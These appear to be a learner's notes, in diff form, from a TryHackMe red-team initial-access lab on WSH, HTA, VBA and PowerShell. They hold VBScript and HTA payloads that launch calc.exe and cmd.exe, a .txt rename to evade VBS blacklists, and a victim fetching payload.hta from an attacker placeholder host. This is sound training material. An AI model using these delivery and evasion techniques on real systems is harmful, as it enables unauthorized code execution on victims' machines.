@@ -1,1 +1,82 @@
-https://tryhackme.com/module/red-team-initial-access
+----------------------------------------------------------
+Windows Scripting Host (WSH)  cscript.exe & wscript.exe
+----------------------------------------------------------
+Dim message 
+message = "Welcome to THM"
+MsgBox messagehttps://tryhackme.com/module/red-team-initial-access
+Windows Scripting Host (WSH)
+
+Windows scripting host is a built-in Windows administration tool that runs batch files to automate and manage tasks within the operating system.
+
+It is a Windows native engine, cscript.exe (for command-line scripts) and wscript.exe (for UI scripts), which are responsible for executing various Microsoft Visual Basic Scripts (VBScript), including vbs and vbe
+
+Simple VBScript code:
+  create file 'hello.vbs' enter in: 
+
+        Dim message 
+        message = "Hello World"
+        MsgBox message
+
+DIM declares var of 'message'
+next, we store the string in var
+next, the  MsgBox function shows the content of the var
+EXECUTE file w/ 
+        
+        # wscript.exe hello.vbs
+
+--------------------------------
+VBScript to run executable files
+--------------------------------
+the following vbs code is to invoke the Windows calculator prompt, proof that we can execute .exe files using the Windows native engine (WSH)
+  create file 'payload.vbs' and enter in:
+  
+        Set shell = WScript.CreateObject("Wscript.Shell")
+        shell.Run("C:\Windows\System32\calc.exe " & WScript.ScriptFullName),0,True
+        
+We create an object of the WScript library using CreateObject to call the execution payload
+next, 'Run' method to execute the payload w/
+  
+        # wscript.exe payload.vbs     /OR/    # cscript.exe payload.vbs
+        
+ If the VBS files are blacklisted, then we can rename the file to .txt file and run it using wscript as follows:
+        
+        # wscript /e:VBScript payload.txt
+
+-----------------------------------
+HTML Application (HTA)   MSHTA.exe
+-----------------------------------
+HTA stands for “HTML Application.” It allows you to create a downloadable file that takes all the information regarding how it is displayed and rendered
+HTAs are dynamic HTML pages containing JScript and VBScript
+MSHTA.exe is used to execute HTA files. It can be executed by itself or automatically from Internet Explorer
+
+the following HTML payload uses 'ActiveXObject' to execute cmd.exe. 
+   create file 'payload.hta' and enter:
+          <html>
+          <body>
+          <script>
+            var c= 'cmd.exe'
+            new ActiveXObject('WScript.Shell').Run(c);
+          </script>
+          </body>
+          </html>
+    Serve file via:
+      
+          # python3 -m http.server 8080
+[victim machine]
+    visit -> http://ATTACKERip:8080/payload.hta
+
+----------------------------------
+Visual Basic for Application (VBA)
+----------------------------------
+a programming language by Microsoft implemented for Microsoft applications such as Microsoft Word, Excel, PowerPoint
+VBA programming allows automating tasks of nearly every keyboard and mouse interaction between a user and Microsoft Office applications
+Macros are Microsoft Office applications that contain embedded code written in a programming language known as (VBA)
+VBA's features is accessing the Windows Application Programming Interface (API) and other low-level functionality
+
+-----------------
+PowerShell (PSH)
+-----------------
+PowerShell is an object-oriented programming language executed from the Dynamic Language Runtime (DLR) in .NET
+
+
+
